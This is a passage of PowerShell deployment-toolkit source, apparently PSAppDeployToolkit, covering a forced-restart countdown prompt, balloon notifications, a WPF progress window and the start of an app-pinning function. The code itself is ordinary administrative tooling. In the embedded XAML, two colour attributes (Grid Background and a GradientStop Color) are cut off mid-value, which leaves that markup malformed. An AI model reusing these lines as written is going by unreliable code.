		$padding.Left = 0
		$padding.Right = 0
		$panelButtons.Margin = $padding
		If ($showCloseApps) { $panelButtons.Controls.Add($buttonCloseApps) }
		If ($showDefer) { $panelButtons.Controls.Add($buttonDefer) }
		$panelButtons.Controls.Add($buttonContinue)

		
		$formWelcome.Controls.Add($panelButtons)

		
		$formWelcomeWindowState = $formWelcome.WindowState
		
		$formWelcome.add_Load($Form_StateCorrection_Load)
		
		$formWelcome.add_FormClosed($Form_Cleanup_FormClosed)

		Function Update-InstallationWelcome {
			$formWelcome.BringToFront()
			$formWelcome.Location = "$($formWelcomeStartPosition.X),$($formWelcomeStartPosition.Y)"
			$formWelcome.Refresh()
		}

		
		Function Get-RunningProcessesDynamically {
			$dynamicRunningProcesses = $null
			Get-RunningProcesses -ProcessObjects $processObjects -DisableLogging -OutVariable 'dynamicRunningProcesses'
			[string]$dynamicRunningProcessDescriptions = ($dynamicRunningProcesses | Where-Object { $_.ProcessDescription } | Select-Object -ExpandProperty 'ProcessDescription' | Select-Object -Unique | Sort-Object) -join ','
				If ($dynamicRunningProcessDescriptions -ne $script:runningProcessDescriptions) {
				
				Set-Variable -Name 'runningProcessDescriptions' -Value $dynamicRunningProcessDescriptions -Force -Scope 'Script'
				If ($dynamicrunningProcesses) {
					Write-Log -Message "The running processes have changed. Updating the apps to close: [$script:runningProcessDescriptions]..." -Source ${CmdletName}
				}
				
				$listboxCloseApps.Items.Clear()
				$script:runningProcessDescriptions -split "," | ForEach-Object { $null = $listboxCloseApps.Items.Add($_) }
			}
			
			If ($ProcessDescriptions) {
				If (-not ($dynamicRunningProcesses)) {
					Write-Log -Message 'Previously detected running processes are no longer running.' -Source ${CmdletName}
						$formWelcome.Dispose()
				}
			}
			
			ElseIf (-not $ProcessDescriptions) {
				If ($dynamicRunningProcesses) {
					Write-Log -Message 'New running processes detected. Updating the form to prompt to close the running applications.' -Source ${CmdletName}
					$formWelcome.Dispose()
				}
			}
		}

		
		If ($minimizeWindows) { $null = $shellApp.MinimizeAll() }

		
		$result = $formWelcome.ShowDialog()
		$formWelcome.Dispose()

		Switch ($result) {
			OK { $result = 'Continue' }
			No { $result = 'Defer' }
			Yes { $result = 'Close' }
			Abort { $result = 'Timeout' }
		}

		If ($configInstallationWelcomePromptDynamicRunningProcessEvaluation){
			$timerRunningProcesses.Stop()
		}

		Write-Output -InputObject $result
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Show-InstallationRestartPrompt {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[int32]$CountdownSeconds = 60,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[int32]$CountdownNoHideSeconds = 30,
		[Parameter(Mandatory=$false)]
		[switch]$NoCountdown = $false
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		
		If ($deployModeSilent) {
			Write-Log -Message "Bypass Installation Restart Prompt [Mode: $deployMode]." -Source ${CmdletName}
			Return
		}
		
		[hashtable]$installRestartPromptParameters = $psBoundParameters

		
		If (Get-Process | Where-Object { $_.MainWindowTitle -match $configRestartPromptTitle }) {
			Write-Log -Message "${CmdletName} was invoked, but an existing restart prompt was detected. Cancelling restart prompt." -Severity 2 -Source ${CmdletName}
			Return
		}

		[datetime]$startTime = Get-Date
		[datetime]$countdownTime = $startTime

		[Windows.Forms.Application]::EnableVisualStyles()
		$formRestart = New-Object -TypeName 'System.Windows.Forms.Form'
		$labelCountdown = New-Object -TypeName 'System.Windows.Forms.Label'
		$labelTimeRemaining = New-Object -TypeName 'System.Windows.Forms.Label'
		$labelMessage = New-Object -TypeName 'System.Windows.Forms.Label'
		$buttonRestartLater = New-Object -TypeName 'System.Windows.Forms.Button'
		$picturebox = New-Object -TypeName 'System.Windows.Forms.PictureBox'
		$buttonRestartNow = New-Object -TypeName 'System.Windows.Forms.Button'
		$timerCountdown = New-Object -TypeName 'System.Windows.Forms.Timer'
		$InitialFormWindowState = New-Object -TypeName 'System.Windows.Forms.FormWindowState'

		[scriptblock]$RestartComputer = {
			Write-Log -Message 'Force restart the computer...' -Source ${CmdletName}
			Restart-Computer -Force
		}

		[scriptblock]$FormEvent_Load = {
			
			[datetime]$currentTime = Get-Date
			[datetime]$countdownTime = $startTime.AddSeconds($countdownSeconds)
			$timerCountdown.Start()
			
			[timespan]$remainingTime = $countdownTime.Subtract($currentTime)
			$labelCountdown.Text = [string]::Format('{0}:{1:d2}:{2:d2}', $remainingTime.Days * 24 + $remainingTime.Hours, $remainingTime.Minutes, $remainingTime.Seconds)
			If ($remainingTime.TotalSeconds -le $countdownNoHideSeconds) { $buttonRestartLater.Enabled = $false }
			$formRestart.WindowState = 'Normal'
			$formRestart.TopMost = $true
			$formRestart.BringToFront()
		}

		[scriptblock]$Form_StateCorrection_Load = {
			
			$formRestart.WindowState = $InitialFormWindowState
			$formRestart.AutoSize = $true
			$formRestart.TopMost = $true
			$formRestart.BringToFront()
			
			Set-Variable -Name 'formInstallationRestartPromptStartPosition' -Value $formRestart.Location -Scope 'Script'
		}

		
		If ($NoCountdown) {
			$timerPersist = New-Object -TypeName 'System.Windows.Forms.Timer'
			$timerPersist.Interval = ($configInstallationRestartPersistInterval * 1000)
			[scriptblock]$timerPersist_Tick = {
				
				$formRestart.WindowState = 'Normal'
				$formRestart.TopMost = $true
				$formRestart.BringToFront()
				$formRestart.Location = "$($formInstallationRestartPromptStartPosition.X),$($formInstallationRestartPromptStartPosition.Y)"
				$formRestart.Refresh()
				[Windows.Forms.Application]::DoEvents()
			}
			$timerPersist.add_Tick($timerPersist_Tick)
			$timerPersist.Start()
		}

		[scriptblock]$buttonRestartLater_Click = {
			
			$formRestart.WindowState = 'Minimized'
			If ($NoCountdown) {
				
				$timerPersist.Stop()
				$timerPersist.Start()
			}
		}

		
		[scriptblock]$buttonRestartNow_Click = { & $RestartComputer }

		
		[scriptblock]$formRestart_Resize = { If ($formRestart.WindowState -eq 'Minimized') { $formRestart.WindowState = 'Minimized' } }

		[scriptblock]$timerCountdown_Tick = {
			
			[datetime]$currentTime = Get-Date
			[datetime]$countdownTime = $startTime.AddSeconds($countdownSeconds)
			[timespan]$remainingTime = $countdownTime.Subtract($currentTime)
			
			If ($countdownTime -lt $currentTime) {
				$buttonRestartNow.PerformClick()
			}
			Else {
				
				$labelCountdown.Text = [string]::Format('{0}:{1:d2}:{2:d2}', $remainingTime.Days * 24 + $remainingTime.Hours, $remainingTime.Minutes, $remainingTime.Seconds)
				If ($remainingTime.TotalSeconds -le $countdownNoHideSeconds) {
					$buttonRestartLater.Enabled = $false
					
					If ($formRestart.WindowState -eq 'Minimized') {
						
						$formRestart.WindowState = 'Normal'
						$formRestart.TopMost = $true
						$formRestart.BringToFront()
						$formRestart.Location = "$($formInstallationRestartPromptStartPosition.X),$($formInstallationRestartPromptStartPosition.Y)"
						$formRestart.Refresh()
						[Windows.Forms.Application]::DoEvents()
					}
				}
				[Windows.Forms.Application]::DoEvents()
			}
		}

		
		[scriptblock]$Form_Cleanup_FormClosed = {
			Try {
				$buttonRestartLater.remove_Click($buttonRestartLater_Click)
				$buttonRestartNow.remove_Click($buttonRestartNow_Click)
				$formRestart.remove_Load($FormEvent_Load)
				$formRestart.remove_Resize($formRestart_Resize)
				$timerCountdown.remove_Tick($timerCountdown_Tick)
				$timerPersist.remove_Tick($timerPersist_Tick)
				$formRestart.remove_Load($Form_StateCorrection_Load)
				$formRestart.remove_FormClosed($Form_Cleanup_FormClosed)
			}
			Catch { }
		}

		
		If (-not $NoCountdown) {
			$formRestart.Controls.Add($labelCountdown)
			$formRestart.Controls.Add($labelTimeRemaining)
		}
		$formRestart.Controls.Add($labelMessage)
		$formRestart.Controls.Add($buttonRestartLater)
		$formRestart.Controls.Add($picturebox)
		$formRestart.Controls.Add($buttonRestartNow)
		$clientSizeY = 260 + $appDeployLogoBannerHeightDifference
		$formRestart.ClientSize = "450,$clientSizeY"
		$formRestart.ControlBox = $false
		$formRestart.FormBorderStyle = 'FixedDialog'
		$formRestart.Icon = New-Object -TypeName 'System.Drawing.Icon' -ArgumentList $AppDeployLogoIcon
		$formRestart.MaximizeBox = $false
		$formRestart.MinimizeBox = $false
		$formRestart.Name = 'formRestart'
		$formRestart.StartPosition = 'CenterScreen'
		$formRestart.Text = "$($configRestartPromptTitle): $installTitle"
		$formRestart.add_Load($FormEvent_Load)
		$formRestart.add_Resize($formRestart_Resize)

		
		$picturebox.Anchor = 'Top'
		$picturebox.Image = [Drawing.Image]::Fromfile($AppDeployLogoBanner)
		$picturebox.Location = '0,0'
		$picturebox.Name = 'picturebox'
		$pictureboxSizeY = $appDeployLogoBannerHeight
		$picturebox.Size = "450,$pictureboxSizeY"
		$picturebox.SizeMode = 'CenterImage'
		$picturebox.TabIndex = 1
		$picturebox.TabStop = $false

		
		$labelMessageLocationY = 58 + $appDeployLogoBannerHeightDifference
		$labelMessage.Location = "20,$labelMessageLocationY"
		$labelMessage.Name = 'labelMessage'
		$labelMessage.Size = '400,79'
		$labelMessage.TabIndex = 3
		$labelMessage.Text = "$configRestartPromptMessage $configRestartPromptMessageTime `n`n$configRestartPromptMessageRestart"
		If ($NoCountdown) { $labelMessage.Text = $configRestartPromptMessage }
		$labelMessage.TextAlign = 'MiddleCenter'

		
		$labelTimeRemainingLocationY = 138 + $appDeployLogoBannerHeightDifference
		$labelTimeRemaining.Location = "20,$labelTimeRemainingLocationY"
		$labelTimeRemaining.Name = 'labelTimeRemaining'
		$labelTimeRemaining.Size = '400,23'
		$labelTimeRemaining.TabIndex = 4
		$labelTimeRemaining.Text = $configRestartPromptTimeRemaining
		$labelTimeRemaining.TextAlign = 'MiddleCenter'

		
		$labelCountdown.Font = 'Microsoft Sans Serif, 18pt, style=Bold'
		$labelCountdownLocationY = 165 + $appDeployLogoBannerHeightDifference
		$labelCountdown.Location = "20,$labelCountdownLocationY"
		$labelCountdown.Name = 'labelCountdown'
		$labelCountdown.Size = '400,30'
		$labelCountdown.TabIndex = 5
		$labelCountdown.Text = '00:00:00'
		$labelCountdown.TextAlign = 'MiddleCenter'

		
		$buttonsLocationY = 216 + $appDeployLogoBannerHeightDifference

		
		$buttonRestartLater.Anchor = 'Bottom,Left'
		$buttonRestartLater.Location = "20,$buttonsLocationY"
		$buttonRestartLater.Name = 'buttonRestartLater'
		$buttonRestartLater.Size = '159,23'
		$buttonRestartLater.TabIndex = 0
		$buttonRestartLater.Text = $configRestartPromptButtonRestartLater
		$buttonRestartLater.UseVisualStyleBackColor = $true
		$buttonRestartLater.add_Click($buttonRestartLater_Click)

		
		$buttonRestartNow.Anchor = 'Bottom,Right'
		$buttonRestartNow.Location = "265,$buttonsLocationY"
		$buttonRestartNow.Name = 'buttonRestartNow'
		$buttonRestartNow.Size = '159,23'
		$buttonRestartNow.TabIndex = 2
		$buttonRestartNow.Text = $configRestartPromptButtonRestartNow
		$buttonRestartNow.UseVisualStyleBackColor = $true
		$buttonRestartNow.add_Click($buttonRestartNow_Click)

		
		If (-not $NoCountdown) { $timerCountdown.add_Tick($timerCountdown_Tick) }

		

		
		$InitialFormWindowState = $formRestart.WindowState
		
		$formRestart.add_Load($Form_StateCorrection_Load)
		
		$formRestart.add_FormClosed($Form_Cleanup_FormClosed)
		$formRestartClosing = [Windows.Forms.FormClosingEventHandler]{ If ($_.CloseReason -eq 'UserClosing') { $_.Cancel = $true } }
		$formRestart.add_FormClosing($formRestartClosing)

		
		If ($deployAppScriptFriendlyName) {
			If ($NoCountdown) {
				Write-Log -Message "Invoking ${CmdletName} asynchronously with no countdown..." -Source ${CmdletName}
			}
			Else {
				Write-Log -Message "Invoking ${CmdletName} asynchronously with a [$countDownSeconds] second countdown..." -Source ${CmdletName}
			}
			[string]$installRestartPromptParameters = ($installRestartPromptParameters.GetEnumerator() | ForEach-Object {
				If ($_.Value.GetType().Name -eq 'SwitchParameter') {
					"-$($_.Key)"
				}
				ElseIf ($_.Value.GetType().Name -eq 'Boolean') {
					"-$($_.Key) `$" + "$($_.Value)".ToLower()
				}
				ElseIf ($_.Value.GetType().Name -eq 'Int32') {
					"-$($_.Key) $($_.Value)"
				}
				Else {
					"-$($_.Key) `"$($_.Value)`""
				}
			}) -join ' '
			Start-Process -FilePath "$PSHOME\powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -NoProfile -NoLogo -WindowStyle Hidden -File `"$scriptPath`" -ReferredInstallTitle `"$installTitle`" -ReferredInstallName `"$installName`" -ReferredLogName `"$logName`" -ShowInstallationRestartPrompt $installRestartPromptParameters -AsyncToolkitLaunch" -WindowStyle 'Hidden' -ErrorAction 'SilentlyContinue'
		}
		Else {
			If ($NoCountdown) {
				Write-Log -Message 'Display restart prompt with no countdown.' -Source ${CmdletName}
			}
			Else {
				Write-Log -Message "Display restart prompt with a [$countDownSeconds] second countdown." -Source ${CmdletName}
			}

			
			Write-Output -InputObject $formRestart.ShowDialog()
			$formRestart.Dispose()

			
			[Diagnostics.Process]$powershellProcess = Get-Process | Where-Object { $_.MainWindowTitle -match $installTitle }
			[Microsoft.VisualBasic.Interaction]::AppActivate($powershellProcess.ID)
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Show-BalloonTip {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true,Position=0)]
		[ValidateNotNullOrEmpty()]
		[string]$BalloonTipText,
		[Parameter(Mandatory=$false,Position=1)]
		[ValidateNotNullorEmpty()]
		[string]$BalloonTipTitle = $installTitle,
		[Parameter(Mandatory=$false,Position=2)]
		[ValidateSet('Error','Info','None','Warning')]
		[Windows.Forms.ToolTipIcon]$BalloonTipIcon = 'Info',
		[Parameter(Mandatory=$false,Position=3)]
		[ValidateNotNullorEmpty()]
		[int32]$BalloonTipTime = 10000
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		
		If (($deployModeSilent) -or (-not $configShowBalloonNotifications) -or (Test-PowerPoint)) { Return }

		
		If ($script:notifyIcon) { Try { $script:notifyIcon.Dispose() } Catch {} }

		
		Try { [string]$callingFunction = (Get-Variable -Name MyInvocation -Scope 1).Value.Mycommand.Name } Catch { }

		If ($callingFunction -eq 'Exit-Script') {
			Write-Log -Message "Display balloon tip notification asynchronously with message [$BalloonTipText]." -Source ${CmdletName}
			
			[scriptblock]$notifyIconScriptBlock = {
				Param (
					[Parameter(Mandatory=$true,Position=0)]
					[ValidateNotNullOrEmpty()]
					[string]$BalloonTipText,
					[Parameter(Mandatory=$false,Position=1)]
					[ValidateNotNullorEmpty()]
					[string]$BalloonTipTitle,
					[Parameter(Mandatory=$false,Position=2)]
					[ValidateSet('Error','Info','None','Warning')]
					$BalloonTipIcon, 
					[Parameter(Mandatory=$false,Position=3)]
					[ValidateNotNullorEmpty()]
					[int32]$BalloonTipTime,
					[Parameter(Mandatory=$false,Position=4)]
					[ValidateNotNullorEmpty()]
					[string]$AppDeployLogoIcon
				)

				
				Add-Type -AssemblyName 'System.Windows.Forms' -ErrorAction 'Stop'
				Add-Type -AssemblyName 'System.Drawing' -ErrorAction 'Stop'

				[Windows.Forms.ToolTipIcon]$BalloonTipIcon = $BalloonTipIcon
				$script:notifyIcon = New-Object -TypeName 'System.Windows.Forms.NotifyIcon' -Property @{
					BalloonTipIcon = $BalloonTipIcon
					BalloonTipText = $BalloonTipText
					BalloonTipTitle = $BalloonTipTitle
					Icon = New-Object -TypeName 'System.Drawing.Icon' -ArgumentList $AppDeployLogoIcon
					Text = -join $BalloonTipText[0..62]
					Visible = $true
				}

				
				$script:NotifyIcon.ShowBalloonTip($BalloonTipTime)

				
				Start-Sleep -Milliseconds ($BalloonTipTime)
				$script:notifyIcon.Dispose()
			}

			
			Try {
				Execute-Process -Path "$PSHOME\powershell.exe" -Parameters "-ExecutionPolicy Bypass -NoProfile -NoLogo -WindowStyle Hidden -Command & {$notifyIconScriptBlock} '$BalloonTipText' '$BalloonTipTitle' '$BalloonTipIcon' '$BalloonTipTime' '$AppDeployLogoIcon'" -NoWait -WindowStyle 'Hidden' -CreateNoWindow
			}
			Catch { }
		}
		
		Else {
			Write-Log -Message "Display balloon tip notification with message [$BalloonTipText]." -Source ${CmdletName}
			[Windows.Forms.ToolTipIcon]$BalloonTipIcon = $BalloonTipIcon
			$script:notifyIcon = New-Object -TypeName 'System.Windows.Forms.NotifyIcon' -Property @{
				BalloonTipIcon = $BalloonTipIcon
				BalloonTipText = $BalloonTipText
				BalloonTipTitle = $BalloonTipTitle
				Icon = New-Object -TypeName 'System.Drawing.Icon' -ArgumentList $AppDeployLogoIcon
				Text = -join $BalloonTipText[0..62]
				Visible = $true
			}

			
			$script:NotifyIcon.ShowBalloonTip($BalloonTipTime)
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Show-InstallationProgress {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$StatusMessage = $configProgressMessageInstall,
		[Parameter(Mandatory=$false)]
		[ValidateSet('Default','BottomRight')]
		[string]$WindowLocation = 'Default',
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$TopMost = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		If ($deployModeSilent) { Return }

		
		If (($StatusMessage -eq $configProgressMessageInstall) -and ($deploymentType -eq 'Uninstall')) {
			$StatusMessage = $configProgressMessageUninstall
		}

		If ($envHost.Name -match 'PowerGUI') {
			Write-Log -Message "$($envHost.Name) is not a supported host for WPF multi-threading. Progress dialog with message [$statusMessage] will not be displayed." -Severity 2 -Source ${CmdletName}
			Return
		}

		
		If ($script:ProgressSyncHash.Window.Dispatcher.Thread.ThreadState -ne 'Running') {
			
			$balloonText = "$deploymentTypeName $configBalloonTextStart"
			Show-BalloonTip -BalloonTipIcon 'Info' -BalloonTipText $balloonText
			
			$script:ProgressSyncHash = [hashtable]::Synchronized(@{ })
			
			$script:ProgressRunspace = [runspacefactory]::CreateRunspace()
			$script:ProgressRunspace.ApartmentState = 'STA'
			$script:ProgressRunspace.ThreadOptions = 'ReuseThread'
			$script:ProgressRunspace.Open()
			
			$script:ProgressRunspace.SessionStateProxy.SetVariable('progressSyncHash', $script:ProgressSyncHash)
			
			$script:ProgressRunspace.SessionStateProxy.SetVariable('installTitle', $installTitle)
			$script:ProgressRunspace.SessionStateProxy.SetVariable('windowLocation', $windowLocation)
			$script:ProgressRunspace.SessionStateProxy.SetVariable('topMost', $topMost.ToString())
			$script:ProgressRunspace.SessionStateProxy.SetVariable('appDeployLogoBanner', $appDeployLogoBanner)
			$script:ProgressRunspace.SessionStateProxy.SetVariable('appDeployLogoBannerHeight', $appDeployLogoBannerHeight)
			$script:ProgressRunspace.SessionStateProxy.SetVariable('appDeployLogoBannerHeightDifference', $appDeployLogoBannerHeightDifference)
			$script:ProgressRunspace.SessionStateProxy.SetVariable('ProgressStatusMessage', $statusMessage)
			$script:ProgressRunspace.SessionStateProxy.SetVariable('AppDeployLogoIcon', $AppDeployLogoIcon)
			$script:ProgressRunspace.SessionStateProxy.SetVariable('dpiScale', $dpiScale)

			
			$progressCmd = [PowerShell]::Create().AddScript({
				[string]$xamlProgressString = @'
							<Window
							xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
							xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
							x:Name="Window" Title="PSAppDeployToolkit"
							MaxHeight="%MaxHeight%" MinHeight="%MinHeight%" Height="%Height%"
							MaxWidth="456" MinWidth="456" Width="456" Padding="0,0,0,0" Margin="0,0,0,0"
							WindowStartupLocation = "Manual"
							Top="0"
							Left="0"
							Topmost="True"
							ResizeMode="NoResize"
							Icon=""
							ShowInTaskbar="True">
							<Window.Resources>
								<Storyboard x:Key="Storyboard1" RepeatBehavior="Forever">
									<DoubleAnimationUsingKeyFrames BeginTime="00:00:00" Storyboard.TargetName="ellipse" Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[2].(RotateTransform.Angle)">
									<SplineDoubleKeyFrame KeyTime="00:00:02" Value="360"/>
									</DoubleAnimationUsingKeyFrames>
								</Storyboard>
							</Window.Resources>
							<Window.Triggers>
								<EventTrigger RoutedEvent="FrameworkElement.Loaded">
									<BeginStoryboard Storyboard="{StaticResource Storyboard1}"/>
								</EventTrigger>
							</Window.Triggers>
							<Grid Background="
								<Grid.RowDefinitions>
									<RowDefinition Height="%BannerHeight%"/>
									<RowDefinition Height="100"/>
								</Grid.RowDefinitions>
								<Grid.ColumnDefinitions>
									<ColumnDefinition Width="45"></ColumnDefinition>
									<ColumnDefinition Width="*"></ColumnDefinition>
								</Grid.ColumnDefinitions>
								<Image x:Name = "ProgressBanner" Grid.ColumnSpan="2" Margin="0,0,0,0" Source=""></Image>
								<TextBlock x:Name = "ProgressText" Grid.Row="1" Grid.Column="1" Margin="0,5,45,10" Text="" FontSize="15" FontFamily="Microsoft Sans Serif" HorizontalAlignment="Center" VerticalAlignment="Center" TextAlignment="Center" Padding="15" TextWrapping="Wrap"></TextBlock>
								<Ellipse x:Name = "ellipse" Grid.Row="1" Grid.Column="0" Margin="0,0,0,0" StrokeThickness="5" RenderTransformOrigin="0.5,0.5" Height="25" Width="25" HorizontalAlignment="Right" VerticalAlignment="Center">
									<Ellipse.RenderTransform>
										<TransformGroup>
											<ScaleTransform/>
											<SkewTransform/>
											<RotateTransform/>
										</TransformGroup>
									</Ellipse.RenderTransform>
									<Ellipse.Stroke>
										<LinearGradientBrush EndPoint="0.445,0.997" StartPoint="0.555,0.003">
											<GradientStop Color="White" Offset="0"/>
											<GradientStop Color="
										</LinearGradientBrush>
									</Ellipse.Stroke>
								</Ellipse>
								</Grid>
							</Window>
'@
				
				$xamlProgressString = $xamlProgressString.replace('%BannerHeight%', $appDeployLogoBannerHeight).replace('%Height%', 180 + $appDeployLogoBannerHeightDifference).replace('%MinHeight%', 180 + $appDeployLogoBannerHeightDifference).replace('%MaxHeight%', 200 + $appDeployLogoBannerHeightDifference)
				[Xml.XmlDocument]$xamlProgress = New-Object 'System.Xml.XmlDocument'
				$xamlProgress.LoadXml($xamlProgressString)
				
				
				$screen = [Windows.Forms.Screen]::PrimaryScreen
				$screenWorkingArea = $screen.WorkingArea
				[int32]$screenWidth = $screenWorkingArea | Select-Object -ExpandProperty 'Width'
				[int32]$screenHeight = $screenWorkingArea | Select-Object -ExpandProperty 'Height'
				
				If ($windowLocation -eq 'BottomRight') {
					$xamlProgress.Window.Left = [string](($screenWidth / ($dpiscale / 100)) - ($xamlProgress.Window.Width))
					$xamlProgress.Window.Top = [string](($screenHeight / ($dpiscale / 100)) - ($xamlProgress.Window.Height))
				}
				
				Else {
					
					$xamlProgress.Window.Left = [string](($screenWidth / (2 * ($dpiscale / 100) )) - (($xamlProgress.Window.Width / 2)))
					$xamlProgress.Window.Top = [string]($screenHeight / 9.5)
				}
				$xamlProgress.Window.TopMost = $topMost
				$xamlProgress.Window.Icon = $AppDeployLogoIcon
				$xamlProgress.Window.Grid.Image.Source = $appDeployLogoBanner
				$xamlProgress.Window.Grid.TextBlock.Text = $ProgressStatusMessage
				$xamlProgress.Window.Title = $installTitle
				
				$progressReader = New-Object -TypeName 'System.Xml.XmlNodeReader' -ArgumentList $xamlProgress
				$script:ProgressSyncHash.Window = [Windows.Markup.XamlReader]::Load($progressReader)
				
				$script:ProgressSyncHash.Window.add_Loaded({
					[IntPtr]$windowHandle = (New-Object -TypeName System.Windows.Interop.WindowInteropHelper -ArgumentList $this).Handle
					If ($null -ne $windowHandle) {
						[IntPtr]$menuHandle = [PSADT.UiAutomation]::GetSystemMenu($windowHandle, $false)
						If ($menuHandle -ne [IntPtr]::Zero) {
							[PSADT.UiAutomation]::EnableMenuItem($menuHandle, 0xF060, 0x00000001)
							[PSADT.UiAutomation]::DestroyMenu($menuHandle)
						}
					}
				})
				
				$script:ProgressSyncHash.ProgressText = $script:ProgressSyncHash.Window.FindName('ProgressText')
				
				$script:ProgressSyncHash.Window.Add_Closing({ $_.Cancel = $true })
				
				$script:ProgressSyncHash.Window.Add_MouseLeftButtonDown({ $script:ProgressSyncHash.Window.DragMove() })
				
				$script:ProgressSyncHash.Window.ToolTip = $installTitle
				$null = $script:ProgressSyncHash.Window.ShowDialog()
				$script:ProgressSyncHash.Error = $Error
			})

			$progressCmd.Runspace = $script:ProgressRunspace
			Write-Log -Message "Spin up progress dialog in a separate thread with message: [$statusMessage]." -Source ${CmdletName}
			
			$progressData = $progressCmd.BeginInvoke()
			
			Start-Sleep -Seconds 1
			If ($script:ProgressSyncHash.Error) {
				Write-Log -Message "Failure while displaying progress dialog. `n$(Resolve-Error -ErrorRecord $script:ProgressSyncHash.Error)" -Severity 3 -Source ${CmdletName}
			}
		}
		
		ElseIf ($script:ProgressSyncHash.Window.Dispatcher.Thread.ThreadState -eq 'Running') {
			
			Try {
				$script:ProgressSyncHash.Window.Dispatcher.Invoke([Windows.Threading.DispatcherPriority]'Send', [Windows.Input.InputEventHandler]{ $script:ProgressSyncHash.ProgressText.Text = $statusMessage }, $null, $null)
				Write-Log -Message "Updated progress message: [$statusMessage]." -Source ${CmdletName}
			}
			Catch {
				Write-Log -Message "Unable to update the progress message. `n$(Resolve-Error)" -Severity 2 -Source ${CmdletName}
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Close-InstallationProgress {

	[CmdletBinding()]
	Param (
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		If ($script:ProgressSyncHash.Window.Dispatcher.Thread.ThreadState -eq 'Running') {
			
			Write-Log -Message 'Close the installation progress dialog.' -Source ${CmdletName}
			$script:ProgressSyncHash.Window.Dispatcher.InvokeShutdown()
			$script:ProgressSyncHash.Clear()
			$script:ProgressRunspace.Close()
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Set-PinnedApplication {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateSet('PintoStartMenu','UnpinfromStartMenu','PintoTaskbar','UnpinfromTaskbar')]
		[string]$Action,
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$FilePath
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header

		
		Function Get-PinVerb {
			[CmdletBinding()]
			Param (
				[Parameter(Mandatory=$true)]
				[ValidateNotNullorEmpty()]
				[int32]$VerbId
			)

			[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name

			Write-Log -Message "Get localized pin verb for verb id [$VerbID]." -Source ${CmdletName}
			[string]$PinVerb = [PSADT.FileVerb]::GetPinVerb($VerbId)
			Write-Log -Message "Verb ID [$VerbID] has a localized pin verb of [$PinVerb]." -Source ${CmdletName}
			Write-Output -InputObject $PinVerb
		}
		

		
		Function Invoke-Verb {
			[CmdletBinding()]
			Param (
				[Parameter(Mandatory=$true)]
				[ValidateNotNullorEmpty()]
				[string]$FilePath,
				[Parameter(Mandatory=$true)]
				[ValidateNotNullorEmpty()]
				[string]$Verb
			)

			Try {
				[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
				$verb = $verb.Replace('&','')
				$path = Split-Path -Path $FilePath -Parent -ErrorAction 'Stop'
				$folder = $shellApp.Namespace($path)
				$item = $folder.ParseName((Split-Path -Path $FilePath -Leaf -ErrorAction 'Stop'))
				$itemVerb = $item.Verbs() | Where-Object { $_.Name.Replace('&','') -eq $verb } -ErrorAction 'Stop'

				If ($null -eq $itemVerb) {
					Write-Log -Message "Performing action [$verb] is not programmatically supported for this file [$FilePath]." -Severity 2 -Source ${CmdletName}
				}
				Else {
					Write-Log -Message "Perform action [$verb] on [$FilePath]." -Source ${CmdletName}
					$itemVerb.DoIt()
				}
			}
			Catch {
				Write-Log -Message "Failed to perform action [$verb] on [$FilePath]. `n$(Resolve-Error)" -Severity 2 -Source ${CmdletName}
			}
		}
		

		If (([version]$envOSVersion).Major -ge 10) {
			Write-Log -Message "Detected Windows 10 or higher, using Windows 10 verb codes." -Source ${CmdletName}
			[hashtable]$Verbs = @{
				'PintoStartMenu' = 51201
				'UnpinfromStartMenu' = 51394
				'PintoTaskbar' = 5386
				'UnpinfromTaskbar' = 5387
			}
		}
		Else {
			[hashtable]$Verbs = @{
			'PintoStartMenu' = 5381
			'UnpinfromStartMenu' = 5382
			'PintoTaskbar' = 5386
			'UnpinfromTaskbar' = 5387
			}
		}

	}
	Process {
		Try {
			Write-Log -Message "Execute action [$Action] for file [$FilePath]." -Source ${CmdletName}

			If (-not (Test-Path -LiteralPath $FilePath -PathType 'Leaf' -ErrorAction 'Stop')) {
				Throw "Path [$filePath] does not exist."
			}

			If (-not ($Verbs.$Action)) {
				Throw "Action [$Action] not supported. Supported actions are [$($Verbs.Keys -join ', ')]."
			}

			If ($Action.Contains("StartMenu"))
			{
